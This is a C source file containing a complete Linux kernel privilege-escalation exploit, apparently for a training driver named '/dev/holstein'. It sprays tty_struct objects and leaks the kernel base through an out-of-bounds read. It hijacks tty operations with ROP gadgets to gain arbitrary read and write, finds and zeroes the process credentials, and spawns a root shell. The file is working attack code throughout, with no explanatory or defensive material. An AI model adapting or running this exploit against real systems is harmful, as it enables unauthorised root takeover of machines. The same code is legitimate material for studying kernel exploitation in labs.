#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define SPRAY_NUM 100

#define ofs_tty_ops 0xc38880
#define mov_ptr_rdx_rcx_ret (kbase + 0x1b7dd6)
#define mov_eax_ptr_rdx_ret (kbase + 0x440428)

void fatal(char *msg) {
  perror(msg);
  exit(-1);
}

int fd;
unsigned long kbase;
unsigned long g_buf;
int spray[SPRAY_NUM];
char buf[0x500];
int cache_fd = -1;

unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1) {
    unsigned long *p = (unsigned long *)&buf;
    p[12] = mov_eax_ptr_rdx_ret;
    *(unsigned long *)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);

    for (int i = 0; i < SPRAY_NUM; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else
    return ioctl(cache_fd, 0, addr);
}

void AAW32(unsigned long addr, unsigned int val) {
  printf("[*] AAW: writing 0x%x at 0x%lx\n", val, addr);
  unsigned long *p = (unsigned long *)&buf;
  p[0xc] = mov_ptr_rdx_rcx_ret;
  *(unsigned long *)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  for (int i = 0; i < SPRAY_NUM; i++)
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
}

int main() {
  printf("[*] spraying %d tty_struct objects\n", SPRAY_NUM / 2);
  for (int i = 0; i < SPRAY_NUM / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("open");
  }
  printf("[+] /dev/holstein opened\n");
  fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("open");

  printf("[*] spraying %d tty_struct objects\n", SPRAY_NUM / 2);
  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("open");
  }

  printf("[*] leaking kernel base and g_buf with OOB read\n");
  read(fd, buf, 0x500);
  kbase = *(unsigned long *)&buf[0x418] - ofs_tty_ops;
  g_buf = *(unsigned long *)&buf[0x438] - 0x438;
  printf("[+] leaked kernel base address: 0x%lx\n", kbase);
  printf("[+] leaked g_buf address: 0x%lx\n", g_buf);

  puts("[*] changing .comm to aptx4869");
  if (prctl(PR_SET_NAME, "aptx4869") != 0)
    fatal("prctl");

  unsigned long addr;
  for (addr = g_buf - 0x1000000;; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("[*] searching for aptx4869 at 0x%lx\n", addr);

    if (AAR32(addr) == 0x78747061 && AAR32(addr + 4) == 0x39363834) {
      printf("[+] .comm found at 0x%lx\n", addr);
      break;
    }
  }

  unsigned long addr_cred = 0;
  addr_cred |= AAR32(addr - 8);
  addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
  printf("[+] current->cred = 0x%lx\n", addr_cred);

  puts("[*] changing cred to root");
  for (int i = 1; i < 9; i++)
    AAW32(addr_cred + i * 4, 0);

  puts("[*] spawning root shell");
  system("/bin/sh");

  close(fd);
  for (int i = 0; i < SPRAY_NUM; i++)
    close(spray[i]);

  return 0;
}